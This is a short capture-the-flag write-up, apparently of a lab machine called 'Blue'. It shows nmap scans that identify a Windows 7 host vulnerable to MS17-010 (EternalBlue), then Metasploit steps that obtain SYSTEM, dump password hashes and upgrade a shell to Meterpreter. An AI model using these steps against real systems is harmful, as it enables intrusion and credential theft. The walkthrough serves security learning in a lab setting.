---
title: "blue"

date: "2023-05-17"

author: "MatDef"

  

---

# Information Gathering

  

### Nmap
```shell
$ nmap -A <ip>          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-24 12:51 EDT
Nmap scan report for 10.10.244.88
Host is up (0.053s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2023-05-23T15:36:34
|_Not valid after:  2023-11-22T15:36:34
|_ssl-date: 2023-05-24T16:53:29+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2023-05-24T16:53:23+00:00
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 59m59s, deviation: 2h14m09s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02b54060a537 (unknown)
| smb2-time: 
|   date: 2023-05-24T16:53:23
|_  start_date: 2023-05-24T15:36:32
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-05-24T11:53:23-05:00
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)



```
-> Windows 7 probably Eternal Blue (its in the name ;))


## Enumeration
```shell
$ nmap --script smb-vuln* <ip>        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-24 12:56 EDT
Nmap scan report for 10.10.244.88
Host is up (0.060s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false

```
-> smb-vuln-ms17-010



# Exploitation
Using `msfconsole`
```shell
meterpreter > getsystem
[-] Already running as SYSTEM
```
Already meterpreter shell else upgrade shell with
`sessions -u -1`
Or

```shell
meterpreter > hashdump
```
-> 3 User: Administrator, Guest, Jon


To upgrade the most recently opened session to Meterpreter using the sessions command:

sessions -u -1

Or run the shell_to_meterpreter module manually:

use multi/manage/shell_to_meterpreter
run session=-1
run session=-1 win_transfer=POWERSHELL
run session=-1 win_transfer=VBS


# Privilege Escaltion


  
  

---

  

# References
![](./images/20230524122622.png)